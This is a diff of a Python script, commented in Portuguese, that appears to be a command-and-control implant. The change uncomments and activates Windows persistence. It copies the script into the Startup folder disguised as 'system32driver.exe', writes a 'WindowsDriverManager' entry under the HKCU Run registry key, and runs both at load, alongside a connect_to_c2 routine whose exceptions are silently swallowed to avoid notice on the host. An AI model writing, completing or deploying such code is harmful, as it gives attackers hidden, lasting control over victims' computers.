@@ -67,33 +67,33 @@ def connect_to_c2():
     except:
         pass  # evitar exceções visíveis no host
 
-# # Persistência: cópia + registro
-# def persist():
-#     try:
-#         target_dir = os.environ["APPDATA"] + "\Microsoft\Windows\Start Menu\Programs\Startup"
-#         target_path = os.path.join(target_dir, "system32driver.exe")
-#         if not os.path.exists(target_path):
-#             shutil.copy2(__file__, target_path)
-#     except Exception:
-#         pass
+# Persistência: cópia + registro
+def persist():
+    try:
+        target_dir = os.environ["APPDATA"] + "\Microsoft\Windows\Start Menu\Programs\Startup"
+        target_path = os.path.join(target_dir, "system32driver.exe")
+        if not os.path.exists(target_path):
+            shutil.copy2(__file__, target_path)
+    except Exception:
+        pass
 
-# def persist_registry():
-#     try:
-#         path = os.path.join(os.environ["APPDATA"], "Microsoft\Windows\Start Menu\Programs\Startup", "system32driver.exe")
-#         reg_name = "WindowsDriverManager"
-#         result = subprocess.run(["reg", "query", "HKCU\Software\Microsoft\Windows\CurrentVersion\Run", "/v", reg_name],
-#                                 capture_output=True, text=True)
-#         if reg_name not in result.stdout:
-#             subprocess.run([
-#                 "reg", "add", "HKCU\Software\Microsoft\Windows\CurrentVersion\Run",
-#                 "/v", reg_name, "/t", "REG_SZ", "/d", f'"{path}"', "/f"
-#             ], check=True)
-#     except Exception:
-#         pass
+def persist_registry():
+    try:
+        path = os.path.join(os.environ["APPDATA"], "Microsoft\Windows\Start Menu\Programs\Startup", "system32driver.exe")
+        reg_name = "WindowsDriverManager"
+        result = subprocess.run(["reg", "query", "HKCU\Software\Microsoft\Windows\CurrentVersion\Run", "/v", reg_name],
+                                capture_output=True, text=True)
+        if reg_name not in result.stdout:
+            subprocess.run([
+                "reg", "add", "HKCU\Software\Microsoft\Windows\CurrentVersion\Run",
+                "/v", reg_name, "/t", "REG_SZ", "/d", f'"{path}"', "/f"
+            ], check=True)
+    except Exception:
+        pass
 
-# # Ativação
-# persist()
-# persist_registry()
+# Ativação
+persist()
+persist_registry()
 
 if __name__ == "__main__":
     connect_to_c2()
